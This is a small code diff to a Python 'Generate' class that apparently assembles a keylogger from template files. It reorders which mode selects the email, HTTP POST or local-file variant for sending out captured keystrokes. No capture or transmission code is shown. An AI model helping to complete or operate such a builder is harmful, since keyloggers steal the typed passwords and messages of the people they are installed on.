@@ -114,13 +114,14 @@ class Generate:
             self._1_imports = _file.read()
         with open(FileNames._2_cipher, "r", encoding='utf-8') as _file:
             self._2_cipher = _file.read()
+            
         if self.mode == 1:
             with open(FileNames._3_email, "r", encoding='utf-8') as _file:
                 self._3_keylogger = _file.read()
-        elif self.mode == 2:
-            with open(FileNames._3_file, "r", encoding='utf-8') as _file:
+        elif self.mode == 3:
+            with open(FileNames._3_post, "r", encoding='utf-8') as _file:
                 self._3_keylogger = _file.read()
         else:
-            with open(FileNames._3_post, "r", encoding='utf-8') as _file:
+            with open(FileNames._3_file, "r", encoding='utf-8') as _file:
                 self._3_keylogger = _file.read()
     
